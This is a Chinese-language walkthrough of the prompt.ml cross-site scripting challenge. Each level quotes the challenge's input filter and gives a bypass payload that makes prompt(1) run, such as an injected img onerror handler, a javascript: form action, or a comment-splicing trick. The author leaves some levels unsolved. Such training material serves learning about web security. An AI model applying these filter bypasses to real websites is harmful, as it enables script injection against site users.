# 概述

http://prompt.ml

call prompt(1) to win

# level 0

## 描述

```
function escape(input) {
    //什么都没过滤，但用<script>插入标签无效
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}    
```
## 题解
```
"><img src=1 onerror=prompt(1)>

```

# level 1

## 描述
```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    // 过滤了 <xxx> 与 </xxx> 之类的标签
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}      
```

## 题解
```
//这里可以用回车替代末尾的注释符号
<img src=1 onerror=prompt(1) <!-- 
```

# level 2

## 描述

```
function escape(input) {
    //过滤了 = 与 (
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}     
```

## 题解
```
//注意一定要有<svg>用于启动脚本
//注意 等号不能使用实体编码
<svg><script>prompt&#40;1)</script>
```

# level 3

## 描述

```
function escape(input) {
    // filter potential comment end delimiters
    //将 -> 替换成 _
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}     
```

## 题解
```
--!><img src=1 onerror=prompt(1)>
```

# level 4

## 描述
```
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    // 需要指定的网址 参照上面
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;//这里会对标签进行编码
    } else {
        return 'Invalid resource.';
    }
}    
```

似乎无解 。。。 

看答案通过unicode绕过。。

## levvel 5

## 描述

```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    // 过滤了 > 与 onxxx=之类的响应参数
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}      
```

## 题解
```
// 1 type image 产生一个  image-input
// 2 使用回车绕过检测

"type=image src onerror
="prompt(1)
```

## levvel 6

## 描述

```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        // 分割输入
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);
        // 创建post请求
        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';
        // 创建json格式
        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}   
```

## 题解

需要一些js的知识
主要是在于 ```input.setAttribute('value', formData[i]); ```允许我们对dom进行修改

```
javascript:prompt(1)#{"action":1}
```

## levvel 7

## 描述

```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        // 注意长度限制12
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```

## 题解

通过js注释拼接
```
"><svg/a=#"onload='/*#*/prompt(1)'
```

## levvel 8

## 描述
```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    // 过滤了 /  <  " 与 换行符号 并且输出在注释中
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}       
```

似乎无解，查看答案，又是通过unicode绕过换行符的

## levvel 9

## 描述
```
function escape(input) {
    // filter potential start-tags
    // 过滤了 <字母>
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}     
```
又不会，答案说通过编码 在toUpperCase();绕过

## level 0xA

## 描述 
```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}  
```

## 题解
没啥好说的 仔细看题
```
p'rompt(1)
```

## level #0xB

```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}   
```
过滤了一大堆东西，尝试闭合无果，看一下答案。。。。。并不觉得有意思
```
"(prompt(1))in"
```

## end

先这样吧，后面的题目的确做不出来